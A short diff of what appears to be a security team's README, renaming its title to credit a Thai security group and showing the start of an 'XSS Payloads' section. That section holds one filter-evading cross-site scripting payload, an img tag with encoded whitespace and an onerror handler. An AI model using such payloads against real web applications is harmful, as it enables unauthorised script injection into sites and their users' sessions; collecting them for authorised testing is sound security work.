@@ -1,4 +1,4 @@
-# GrimTheRipper
+# Grim The Ripper Team by SOSECURE Thailand
 
 ## XSS Payloads
 `<img/&#09;&#10;&#11; src=~ onerror=prompt(1)>`
